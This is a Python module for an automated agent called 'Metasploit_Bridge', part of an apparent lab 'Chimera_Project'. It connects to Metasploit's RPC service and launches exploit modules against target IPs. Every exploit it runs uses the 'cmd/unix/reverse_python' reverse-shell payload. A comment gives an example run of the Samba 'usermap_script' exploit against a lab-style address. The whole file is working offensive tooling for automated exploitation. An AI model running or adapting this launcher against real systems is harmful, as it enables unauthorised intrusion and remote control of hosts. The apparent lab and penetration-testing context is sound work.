from chimera_config import get_lab_password
import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import time
import logging
from pymetasploit3.msfrpc import MsfRpcClient

# Ensure the agent can find the core directory
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Metasploit_Bridge:
    def __init__(self):
        self.agent_id = "32"
        self.name = "Metasploit_Bridge"
        self.db = ChimeraDB()
        
        # Setup Logging
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(self.name)

        # Connect to MSFRPC (Start with: msfrpcd -P $LAB_PASSWORD -S)
        try:
            self.client = MsfRpcClient(get_lab_password(), port=55553, ssl=True)
            self.logger.info("Successfully connected to Metasploit RPC.")
        except Exception as e:
            self.logger.error(f"Failed to connect to msfrpcd: {e}")
            self.client = None

    def run_exploit(self, target_ip, module_path, options):
        """Tells Metasploit to execute a specific module."""
        if not self.client: return
        
        exploit = self.client.modules.use('exploit', module_path)
        for key, value in options.items():
            exploit[key] = value
        
        # Launching the exploit
        self.logger.info(f"Launching {module_path} against {target_ip}...")
        job = exploit.execute(payload='cmd/unix/reverse_python')
        
        self.db.report_finding(self.name, "Exploit_Attempt", {
            "target": target_ip,
            "module": module_path,
            "job_id": job['job_id']
        })

    def run(self):
        self.db.heartbeat(self.name)
        # In a production loop, the Bridge_Commander would feed targets here
        # Example: self.run_exploit('10.129.6.50', 'multi/samba/usermap_script', {'RHOSTS': '10.129.6.50'})
        self.db.close()

if __name__ == "__main__":
    agent = Metasploit_Bridge()
    agent.run()
